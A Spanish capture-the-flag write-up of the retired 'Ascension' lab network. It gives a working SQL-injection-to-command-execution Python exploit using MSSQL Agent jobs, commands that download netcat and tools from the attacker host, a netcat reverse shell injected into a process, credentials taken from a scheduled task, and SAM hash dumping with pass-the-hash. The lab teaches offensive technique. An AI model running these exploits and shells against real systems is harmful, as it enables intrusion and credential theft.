---
title: "EndGame - Ascension"
excerpt: "Se realizará un WriteUp del EndGame retirado Ascension que cuenta con máquinas Windows. Desarrollaremos cada una paso a paso con el fin de entender y profundizar en nuevos conceptos."
header:
  teaser: "/assets/images/image.png"
categories:
  - WriteUp
---

<style>
  .teaser-img {
    width: auto; /* Ancho ajustado automáticamente */
    height: 200px; /* Altura de la imagen */
    max-width: 700%; /* Ancho máximo deseado */
    /* Puedes agregar más estilos si es necesario */
  }
</style>

<!-- Puedes usar HTML para la imagen y agregar una clase -->
<img src="{{ page.header.teaser }}" alt="Teaser image" class="teaser-img">

De comienzo tenemos la siguiente información:
```
Ascensión
Por egre55 y TRX

Daedalus Airlines se está convirtiendo rápidamente en un actor importante en la aviación mundial.

El ritmo de crecimiento ha hecho que la empresa haya acumulado mucha deuda técnica. Para evitar una violación de datos y poner en riesgo su cadena de suministro, Daedalus ha contratado a su empresa de seguridad cibernética para probar sus sistemas.

Ascension está diseñado para poner a prueba sus habilidades en enumeración, explotación, pivotación, recorrido de bosque y escalada de privilegios dentro de dos pequeñas redes de Active Directory.

El objetivo es obtener acceso al socio de confianza, moverse a través de la red y comprometer dos bosques de Active Directory mientras recopila varias banderas en el camino. ¿Puedes Ascender?

Punto de entrada: 10.13.38.20
```

Además sabemos que consta de las siguientes maquinas a tener en cuenta:

![](/assets/images/image-1.png)

La exploración inicial de la máquina mediante la herramienta Nmap reveló que solo un puerto se encontraba activo, específicamente el puerto 80, el cual estaba asociado con un servicio web bajo el protocolo HTTP.

Tras identificar el servicio web, procedimos a examinar su contenido, el cual se asemejaba a una página perteneciente a una aerolínea. En dicho sitio, localizamos un botón destinado a la reserva de vuelos.

Al acceder a la página de reservas, se nos permitió ingresar datos relacionados con posibles vuelos. Durante la prueba de entrada de datos, al insertar una comilla simple ('), se generó un error atribuido al sistema de gestión de bases de datos MS SQL. Esta situación sugiere la posibilidad de una vulnerabilidad por inyección SQL, la cual podría ser explotada aprovechando dicho error.

Con el fin de optimizar el proceso y ahorrar tiempo, decidimos emplear la herramienta SQLmap. Inicializamos el escaneo proporcionándole la información relativa al campo que mostró la vulnerabilidad. Utilizando el parámetro "-dbs", procedimos a extraer los nombres de todas las bases de datos disponibles. No obstante, la exploración no arrojó resultados de particular relevancia en dichas bases de datos.

```bash
❯ sqlmap --batch --url http://10.13.38.20/book-trip.php --data "destination=test" -dbs
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[18:18:36] [INFO] resuming back-end DBMS 'microsoft sql server' 
[18:18:36] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: destination (POST)
    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: destination=test' AND 5908 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(107)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (5908=5908) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(106)+CHAR(113)))-- OSNd  

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: destination=test';WAITFOR DELAY '0:0:5'--

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: destination=test' WAITFOR DELAY '0:0:5'-- DCiP
---
[18:18:37] [INFO] the back-end DBMS is Microsoft SQL Server
[18:18:37] [INFO] fetching database names
[18:18:38] [INFO] retrieved: 'daedalus'
[18:18:39] [INFO] retrieved: 'logs'
[18:18:39] [INFO] retrieved: 'master'
[18:18:40] [INFO] retrieved: 'model'
[18:18:40] [INFO] retrieved: 'msdb'
[18:18:41] [INFO] retrieved: 'tempdb'
available databases [6]:
[*] daedalus
[*] logs
[*] master
[*] model
[*] msdb
[*] tempdb
```

  
Mediante el parámetro "--users" de SQLmap, es posible extraer los usuarios asociados a la base de datos, permitiéndonos así obtener información adicional relevante.

Además, para ejecutar consultas personalizadas y tener un mayor control sobre las operaciones realizadas, optaremos por utilizar el parámetro "--sql-shell". Este parámetro nos proporcionará una interfaz de consola que nos permitirá enviar consultas SQL de manera directa, brindando así un mayor nivel de control sobre las acciones ejecutadas en el sistema de gestión de bases de datos

```bash
❯ sqlmap --batch --url http://10.13.38.20/book-trip.php --data "destination=test" --users  
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[14:24:47] [INFO] resuming back-end DBMS 'microsoft sql server' 
[14:24:47] [INFO] testing connection to the target URL
[14:24:48] [INFO] the back-end DBMS is Microsoft SQL Server
[14:24:48] [INFO] fetching database user'
database management system users [18]:
[*] ##MS_AgentSigningCertificate##
[*] ##MS_PolicyEventProcessingLogin##
[*] ##MS_PolicySigningCertificate##
[*] ##MS_PolicyTsqlExecutionLogin##
[*] ##MS_SmoExtendedSigningCertificate##
[*] ##MS_SQLAuthenticatorCertificate##
[*] ##MS_SQLReplicationSigningCertificate##
[*] ##MS_SQLResourceSigningCertificate##
[*] daedalus
[*] daedalus_admin
[*] NT AUTHORITY\\SYSTEM
[*] NT Service\\MSSQLSERVER
[*] NT SERVICE\\SQLSERVERAGENT
[*] NT SERVICE\\SQLTELEMETRY
[*] NT SERVICE\\SQLWriter
[*] NT SERVICE\\Winmgmt
[*] sa
[*] WEB01\\svc_dev
```

```bash
❯ sqlmap --batch --url http://10.13.38.20/book-trip.php --data "destination=test" --sql-shell
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[18:19:09] [INFO] resuming back-end DBMS 'microsoft sql server' 
[18:19:09] [INFO] testing connection to the target URL
[18:19:10] [INFO] the back-end DBMS is Microsoft SQL Server
[18:19:10] [INFO] calling Microsoft SQL Server shell. To quit type 'x' or 'q' and press ENTER  
sql-shell> select suser_name();
[18:22:19] [INFO] fetching SQL SELECT statement query output: 'select suser_name()'
[18:22:20] [INFO] retrieved: 'daedalus'
select suser_name(): 'daedalus'
sql-shell> host_name();
[18:25:12] [INFO] fetching SQL query output: 'host_name()'
[18:25:12] [INFO] retrieved: 'WEB01'
host_name(): 'WEB01'
sql-shell>
```

Después de crear la tabla "roles" con las columnas "username" y "rolename", procedimos a ingresar los nombres y roles de los miembros de la base de datos, siguiendo la documentación relevante. Una vez completada esta tarea, realizamos un volcado de la tabla "roles" para examinar la información obtenida.

Durante la inspección de los datos, identificamos a "daedalus_admin" con el rol "SQLAgentUserRole". Según la documentación pertinente, este rol confiere al usuario la capacidad de crear y ejecutar trabajos dentro del sistema.

```sql
sql-shell> create table roles ([username] sysname, [rolename] sysname)
[14:35:33] [INFO] executing SQL data definition statement: 'create table roles ([username] sysname, [rolename] sysname)'
create table roles ([username] sysname, [rolename] sysname): 'NULL'
sql-shell> insert into roles (username, rolename) select isnull (dp1.name, 'no members') as databaseusername, dp2.name as databaserolename from msdb.sys.database_role_members as drm left outer join msdb.sys.database_principals as dp1 on drm.member_principal_id = dp1.principal_id right outer join msdb.sys.database_principals as dp2 on drm.role_principal_id = dp2.principal_id where dp2.type = 'r' order by dp1.name
[14:35:34] [INFO] executing SQL data manipulation statement: 'insert into roles (username, rolename) select isnull (dp1.name, 'no members') as databaseusername, dp2.name as databaserolename from msdb.sys.database_role_members as drm left outer join msdb.sys.database_principals as dp1 on drm.member_principal_id = dp1.principal_id right outer join msdb.sys.database_principals as dp2 on drm.role_principal_id = dp2.principal_id where dp2.type = 'r' order by dp1.name'  
insert into roles (username, rolename) select isnull (dp1.name, 'no members') as databaseusername, dp2.name as databaserolename from msdb.sys.database_role_members as drm left outer join msdb.sys.database_principals as dp1 on drm.member_principal_id = dp1.principal_id right outer join msdb.sys.database_principals as dp2 on drm.role_principal_id = dp2.principal_id where dp2.type = 'r' order by dp1.name: 'NULL'
sql-s
```

Tras completar la inserción de datos en la tabla "roles", procedimos a realizar un volcado de la misma para examinar su contenido. Durante este proceso de revisión, identificamos que el usuario "daedalus_admin" estaba asociado al rol "SQLAgentUserRole". De acuerdo con la documentación relevante, este rol otorga al usuario la capacidad de crear y ejecutar trabajos (jobs) dentro del sistema de gestión de bases de datos.

```bash
❯ sqlmap --batch --url http://10.13.38.20/book-trip.php --data "destination=test" -D daedalus -T roles -dump  
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: daedalus
Table: roles
[39 entries]
+------------------------------+-----------------------------------+
| rolename                     | username                          |
+------------------------------+-----------------------------------+
| public                       | No members                        |
| TargetServersRole            | No members                        |
| SQLAgentUserRole             | SQLAgentReaderRole                |
| SQLAgentUserRole             | dc_operator                       |
| SQLAgentUserRole             | MS_DataCollectorInternalUser      |
| SQLAgentUserRole             | daedalus_admin                    |
| SQLAgentUserRole             | WEB01\\svc_dev                    |
| SQLAgentReaderRole           | SQLAgentOperatorRole              |
| SQLAgentReaderRole           | daedalus_admin                    |
| SQLAgentReaderRole           | WEB01\\svc_dev                    |
| SQLAgentOperatorRole         | PolicyAdministratorRole           |
| SQLAgentOperatorRole         | daedalus_admin                    |
| SQLAgentOperatorRole         | WEB01\\svc_dev                    |
| DatabaseMailUserRole         | No members                        |
| db_ssisadmin                 | No members                        |
| db_ssisltduser               | dc_operator                       |
| db_ssisltduser               | dc_proxy                          |
| db_ssisoperator              | dc_operator                       |
| db_ssisoperator              | dc_proxy                          |
| db_ssisoperator              | MS_DataCollectorInternalUser      |
| dc_operator                  | dc_admin                          |
| dc_admin                     | MS_DataCollectorInternalUser      |
| dc_proxy                     | No members                        |
| PolicyAdministratorRole      | ##MS_PolicyEventProcessingLogin## |
| PolicyAdministratorRole      | ##MS_PolicyTsqlExecutionLogin##   |
| ServerGroupAdministratorRole | No members                        |
| ServerGroupReaderRole        | ServerGroupAdministratorRole      |
| UtilityCMRReader             | No members                        |
| UtilityIMRWriter             | No members                        |
| UtilityIMRReader             | UtilityIMRWriter                  |
| db_owner                     | dbo                               |
| db_accessadmin               | No members                        |
| db_securityadmin             | No members                        |
| db_ddladmin                  | No members                        |
| db_backupoperator            | No members                        |
| db_datareader                | No members                        |
| db_datawriter                | No members                        |
| db_denydatareader            | No members                        |
| db_denydatawriter            | No members                        |
+------------------------------+-----------------------------------+
```
  
Para enumerar los usuarios a los que nuestro usuario actual puede suplantar, llevaremos a cabo la creación de una tabla llamada "grants", en la cual almacenaremos los nombres de usuario pertinentes. Este proceso puede ser facilitado utilizando un artículo que nos proporciona una guía detallada sobre la enumeración de usuarios a suplantar.

```sql
sql-shell> create table grants (username varchar(1024))
[14:39:19] [INFO] executing SQL data definition statement: 'create table grants (username varchar(1024))'
create table grants (username varchar(1024)): 'NULL'
sql-shell> insert into grants (username) select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate'
[14:39:30] [INFO] executing SQL data manipulation statement: 'insert into grants (username) select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate''  
insert into grants (username) select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate': 'NULL'
```

Luego de realizar el volcado de la tabla "proxy", pudimos identificar las credenciales de "svc_dev", que en su descripción indicaban tener acceso para ejecutar "CmdExec" y "Powershell". Con base en esta investigación, podemos elaborar un pequeño script en Python que automatice la ejecución de comandos exclusivamente a través de trabajos (jobs), aprovechando los privilegios del usuario "daedalus_admin" que hemos suplantado.

```bash
❯ sqlmap --batch --url http://10.13.38.20/book-trip.php --data "destination=test" -D daedalus -T proxy -dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: daedalus
Table: proxy
[1 entry]
+----------+-------------------+---------------+---------+---------+-------------------------------------------------------------+---------------------+----------------------------+
| proxy_id | user_sid          | credential_id | name    | enabled | description                                                 | credential_identity | credential_identity_exists |
+----------+-------------------+---------------+---------+---------+-------------------------------------------------------------+---------------------+----------------------------+
| 1        | ?..?\x15.???????. | 65537         | svc_dev | 1       | Allow user to access the CmdExec and Powershell subsystems. | WEB01\\svc_dev      | 1                          |
+----------+-------------------+---------------+---------+---------+-------------------------------------------------------------+---------------------+----------------------------+  
```

```python
#!/usr/bin/python3
# Shebang: indica al sistema operativo que este script debe ser ejecutado utilizando Python 3

import sys, random, string, requests
# Importación de los módulos necesarios: sys para interactuar con el intérprete de Python,
# random para generar valores aleatorios,
# string para operaciones de cadena y
# requests para realizar solicitudes HTTP.

if len(sys.argv) < 2:
    # Verifica si se proporciona al menos un argumento en la línea de comandos al ejecutar el script.
    print(f"Usage: python3 {sys.argv[0]} <command>")
    sys.exit(1)  # Sale del script con un código de salida 1 (indicando un error).

command = sys.argv[1]
# Obtiene el comando que se pasó como argumento al script.

target = "http://10.13.38.20/book-trip.php"
# Establece el objetivo al que se realizarán las solicitudes. Parece ser una URL.

name = "".join(random.choices(string.ascii_lowercase, k=8))
# Genera un nombre aleatorio de 8 caracteres utilizando letras minúsculas del alfabeto inglés.

query = f"""
use msdb;
exec as login = N'daedalus_admin';
exec msdb.dbo.sp_add_job @job_name = N'{name}_job';
exec msdb.dbo.sp_add_jobstep @job_name = N'{name}_job', @step_name = N'{name}_step', @subsystem = N'cmdexec', @command = N'C:\\Windows\\System32\\cmd.exe /c {command}', @retry_attempts = 1, @retry_interval = 5, @proxy_id = 1;  
exec msdb.dbo.sp_add_jobserver @job_name = N'{name}_job';
exec msdb.dbo.sp_start_job @job_name = N'{name}_job';
"""
# Construye una consulta SQL para ejecutar en la base de datos del destino.
# La consulta parece estar diseñada para agregar un trabajo (job) en la base de datos MSDB de SQL Server,
# con el objetivo de ejecutar un comando proporcionado como argumento.

data = {"destination": f"'; {query}-- -"}
# Construye un diccionario con una clave "destination" y un valor que parece ser una inyección SQL.
# La parte interesante aquí es que la inyección SQL se hace utilizando el valor de query,
# que es el comando construido anteriormente.
# El --; - al final es para comentar el resto de la consulta SQL original y evitar errores.

requests.post(target, data=data)
# Realiza una solicitud HTTP POST al objetivo con los datos proporcionados.
```

Vamos a realizar una comprobación. 

```bash
❯ python3 exploit.py 'curl 10.10.14.6'  
```

```bash
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
10.13.38.20 - - "GET / HTTP/1.1" 200 -
```

  
Nuestro objetivo es obtener acceso al sistema. Para lograrlo, comenzamos descargando el ejecutable netcat.exe en la ubicación C:\ProgramData, la cual es una ruta que todos los usuarios tienen permisos de escritura.

Utilizamos un script en Python llamado exploit.py para realizar la descarga del netcat.exe. Este script utiliza el comando curl para descargar el archivo desde una ubicación remota (10.10.14.10/netcat.exe) y lo guarda en C:\ProgramData\netcat.exe en el sistema comprometido.

Posteriormente, configuramos un servidor HTTP local utilizando el comando sudo python3 -m http.server 80 para servir el archivo netcat.exe.

Una vez que el archivo netcat.exe fue descargado con éxito en el sistema comprometido, procedimos a llamar a netcat.exe y establecer una conexión utilizando PowerShell. Esta conexión fue recibida en la máquina web01, utilizando las credenciales del usuario svc_dev. Como resultado, pudimos acceder y leer la primera flag.

```bash
❯ python3 exploit.py 'curl 10.10.14.6/netcat.exe -o C:\ProgramData\netcat.exe'  
```

```bash
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
10.13.38.20 - - "GET /netcat.exe HTTP/1.1" 200 -
```

```bash
❯ python3 exploit.py 'cmd /c C:\ProgramData\netcat.exe -e powershell 10.10.14.10 443'  
```

```bash
❯ sudo netcat -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.38.20
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Windows\System32> whoami
web01\svc_dev
PS C:\Windows\System32> type C:\Users\svc_dev\Desktop\flag.txt  
ASCENSION{********************}
PS C:\Windows\System32>
```
Empleamos Inveigh para monitorear el tráfico de todas las solicitudes realizadas en la red. En el resultado obtenido, se identificaron algunas solicitudes dirigidas hacia fin01.daedalus.local.

```powershell
PS C:\ProgramData> curl 10.10.14.10/Inveigh.ps1 -o Inveigh.ps1
PS C:\ProgramData> Import-Module .\Inveigh.ps1
PS C:\ProgramData> Invoke-Inveigh -FileOutput Y
[*] Inveigh 1.506 started at 2023-09-02T22:06:41
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 10.13.38.20
[+] Spoofer IP Address = 10.13.38.20
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer = Disabled
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Disabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Disabled
[+] File Output = Enabled
[+] Output Directory = C:\ProgramData
Warning: [!] Run Stop-Inveigh to stop
PS C:\ProgramData> type Inveigh-Log.txt
[+] [2023-09-02T22:06:49] mDNS(QM) request fin01.local received from 10.13.38.20 [spoofer disabled]
[+] [2023-09-02T22:06:49] mDNS(QM) request fin01.local received from 10.13.38.20 [spoofer disabled]
[+] [2023-09-02T22:06:50] NBNS request for FIN01<20> received from 192.168.10.39 [spoofer disabled]
[+] [2023-09-02T22:06:50] NBNS request for FIN01<20> received from 192.168.10.39 [spoofer disabled]
[+] [2023-09-02T22:06:50] DNS request for fin01.daedalus.local sent to 192.168.10.6 [outgoing query]  
PS C:\ProgramData>
```

Es posible que estemos frente a una tarea específica, y aunque contamos con la herramienta Seatbelt para enumerar tareas, primero necesitamos migrar a un proceso. Para ello, procedemos a importar Invoke-PSInject.

```powershell
PS C:\ProgramData> curl 10.10.14.6/Invoke-PSInject.ps1 -o Invoke-PSInject.ps1  
PS C:\ProgramData> Import-Module .\Invoke-PSInject.ps1
PS C:\ProgramData>
```

A continuación, seleccionaremos un proceso al cual migrar. En este caso, optamos por utilizar RunTimeBroker.

```powershell
PS C:\ProgramData> Get-Process RunTimeBroker

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    276      14     3348      15672       0.53   4992   1 RuntimeBroker  
    341      18    20332      33492       2.02   5952   1 RuntimeBroker  
    145       8     1764       7820       0.13   8184   1 RuntimeBroker  

PS C:\ProgramData>
```

Posteriormente, procederemos a crear un payload en base64 que aproveche el uso de Netcat para enviar una reverse shell.

```bash
❯ echo -n 'cmd /c C:\\ProgramData\\netcat.exe -e powershell 10.10.14.10 443' | iconv -t utf16le | base64 -w0
YwBtAGQAIAAvAGMAIABDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABuAGUAdABjAGEAdAAuAGUAeABlACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAAgADEAMAAuADEAMAAuADEANAAuADQAIAA0ADQAMwA=  
```

Tras ejecutar nuestro payload en base64 en el proceso con ID 4992, perteneciente al proceso RunTimeBroker, se ha iniciado una nueva instancia de PowerShell.

```powershell
PS C:\ProgramData> Invoke-PSInject -Procid 4992 -PoshCode YwBtAGQAIAAvAGMAIABDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABuAGUAdABjAGEAdAAuAGUAeABlACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAAgADEAMAAuADEAMAAuADEANAAuADQAIAA0ADQAMwA=  
PS C:\ProgramData>
```

Posteriormente, se inició un servidor Netcat en espera de conexiones en el puerto 443. Una vez recibida una conexión, se estableció una nueva sesión de PowerShell en el sistema comprometido. Bajo este contexto, pudimos identificar que el usuario actual es "svc_dev" en la máquina "web01".

```powershell
❯ sudo netcat -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.38.20
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Windows\System32> whoami
web01\svc_dev
PS C:\Windows\System32>
```

Dentro de este contexto, podemos proceder a enumerar las tareas utilizando Seatbelt. Durante la enumeración, se identificó una tarea llamada AutochkTask que intenta cargar contenido desde \\fin01\invoices. Sin embargo, en el propio comando se muestran credenciales, lo que representa una posible vulnerabilidad de seguridad.

```powershell
PS C:\ProgramData> curl 10.10.14.10/Seatbelt.exe -o Seatbelt.exe
PS C:\ProgramData> .\Seatbelt.exe ScheduledTasks


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%  
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((  
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((  
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((  
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((  
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####  
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####  
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 

====== ScheduledTasks ======

Non Microsoft scheduled tasks (via WMI)

  Name                              :   Server Initial Configuration Task
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   $(@%systemroot%\system32\SrvInitConfig.exe,-100)
  Description                       :   $(@%systemroot%\system32\SrvInitConfig.exe,-101)
  Source                            :   
  State                             :   Disabled
  SDDL                              :   
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /disableconfigtask
      Execute                       :   %windir%\system32\srvinitconfig.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   AutochkTask
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   1
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   svc_dev
  Author                            :   DAEDALUS\Administrator
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/3/2020 3:34:29 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   net use E: \\fin01\invoices /user:billing_user D43d4lusB1ll1ngB055
      Execute                       :   powershell
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2020-01-13T04:13:47
      Interval                      :   PT1M
      StopAtDurationEnd             :   False
      ------------------------------

PS C:\ProgramData>
```

Antes de continuar, estableceremos un proxy para facilitar la conexión con los equipos dentro del dominio. Utilizaremos Ligolo-ng con el agente para conectarnos a nuestro equipo a través del puerto 8888, que especificaremos en el proxy.

```powershell
PS C:\ProgramData> curl 10.10.14.6/agent.exe -o agent.exe
PS C:\ProgramData> .\agent.exe -connect 10.10.14.6:8888 -ignore-cert  
```

Una vez ejecutado el agente, obtendremos una sesión en el proxy. Indicamos esta sesión y luego iniciamos el túnel con el comando start.

```bash
❯ ,/proxy -selfcert -laddr 0.0.0.0:8888
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:8888                    
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

Made in France ♥ by @Nicocha30!

ligolo-ng » 
INFO[0076] Agent joined.           name="WEB01\\svc_dev@WEB01" remote="10.13.38.20:59528"  
ligolo-ng » session
? Specify a session : 1 - WEB01\svc_dev@WEB01 - 10.13.38.20:59528
[Agent : WEB01\svc_dev@WEB01] » start
INFO[0081] Starting tunnel to WEB01\svc_dev@WEB01       
[Agent : WEB01\svc_dev@WEB01] »
```

Después de agregar el segmento 192.168.10.0/24 a la interfaz de Ligolo, confirmamos la conectividad con todos los equipos del dominio realizando un ping a una dirección específica en ese rango.

```bash
❯ sudo ip route add 192.168.10.0/24 dev ligolo

❯ ping -c1 -w1 192.168.10.39
PING 192.168.10.39 (192.168.10.39) 56(84) bytes of data.
64 bytes from 192.168.10.39: icmp_seq=1 ttl=64 time=177 ms

--- 192.168.10.39 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms  
rtt min/avg/max/mdev = 176.552/176.552/176.552/0.000 ms
```

Luego, utilizando CrackMapExec, realizamos un escaneo del segmento /24 para detectar los equipos asociados al dominio "daedalus.local". Se encontraron dos equipos, WEB01 y DC1.

```bash
❯ crackmapexec smb 192.168.10.0/24
SMB         192.168.10.39   445    WEB01            [*] Windows Server 2019 Standard 17763 x64 (name:WEB01) (domain:daedalus.local) (signing:False) (SMBv1:True)  
SMB         192.168.10.6    445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)
```

Para facilitar futuras acciones y ataques, añadimos las direcciones IP y sus respectivos nombres de dominio al archivo /etc/hosts.

```bash
❯ echo "192.168.10.39 web01.daedalus.local" | sudo tee -a /etc/hosts
❯ echo "192.168.10.6 daedalus.local dc1.daedalus.local" | sudo tee -a /etc/hosts  
```

Posteriormente, confirmamos que las credenciales obtenidas en la tarea hacia el controlador de dominio (DC1) son válidas.

```bash
❯ crackmapexec smb dc1.daedalus.local -u billing_user -p D43d4******ngB055
SMB         daedalus.local  445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)  
SMB         daedalus.local  445    DC1              [+] daedalus.local\billing_user:D43d********1ngB055
```

Finalmente, al examinar los administradores locales en WEB01, descubrimos que el usuario "billing_user" es miembro del grupo de administradores a nivel de dominio. Esta cuenta de usuario tiene la misma contraseña que se obtuvo anteriormente.

```powershell
PS C:\ProgramData> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain  

Members

-------------------------------------------------------------------------------
Administrator
DAEDALUS\billing_user
DAEDALUS\Domain Admins
The command completed successfully.
```

Al utilizar CrackMapExec nuevamente, pero esta vez hacia WEB01, se confirmó que se tiene acceso con privilegios máximos ("Pwn3d!"). Por lo tanto, se puede proceder a realizar el volcado de la SAM (Security Accounts Manager).

```bash
❯ crackmapexec smb web01.daedalus.local -u billing_user -p D43d4******ngB055
SMB         web01.daedalus.local 445    WEB01            [*] Windows Server 2019 Standard 17763 x64 (name:WEB01) (domain:daedalus.local) (signing:False) (SMBv1:True)  
SMB         web01.daedalus.local 445    WEB01            [+] daedalus.local\billing_user:D43d4******ngB055 (Pwn3d!)

❯ crackmapexec smb web01.daedalus.local -u billing_user -p D43d4******ngB055 --sam
SMB         web01.daedalus.local 445    WEB01            [*] Windows Server 2019 Standard 17763 x64 (name:WEB01) (domain:daedalus.local) (signing:False) (SMBv1:True)  
SMB         web01.daedalus.local 445    WEB01            [+] daedalus.local\billing_user:D43d4******ngB055 (Pwn3d!)
SMB         web01.daedalus.local 445    WEB01            [*] Dumping SAM hashes
SMB         web01.daedalus.local 445    WEB01            Administrator:500:aad3********************9511b9a10d7d026322e8521:::
SMB         web01.daedalus.local 445    WEB01            Guest:501:aad3b435b514**********************fe0d16ae931b73c59d7e0c089c0:::
SMB         web01.daedalus.local 445    WEB01            DefaultAccount:503:aa****************************e0c089c0:::
SMB         web01.daedalus.local 445    WEB01            WDAGUtilityAccount:504:aad3b****************************5ffc477a12c27bea2:::
SMB         web01.daedalus.local 445    WEB01            svc_dev:1003:aad3b435b*****************************888169ce31d0b80ce67114a74e:::
SMB         web01.daedalus.local 445    WEB01            [+] Added 5 SAM hashes to the database
```

Utilizando el hash del usuario Administrator, logramos conectarnos con Evil-WinRM utilizando el método passthehash. Una vez autenticados, obtenemos una sesión de PowerShell donde verificamos la identidad del usuario actual y leemos el contenido de la bandera ubicada en el escritorio.

```powershell
❯ evil-winrm -i web01.daedalus.local -u Administrator -H ******************  
PS C:\Users\Administrator\Documents> whoami
web01\administrator
PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
ASCENSION{**************}
PS C:\Users\Administrator\Documents>
```
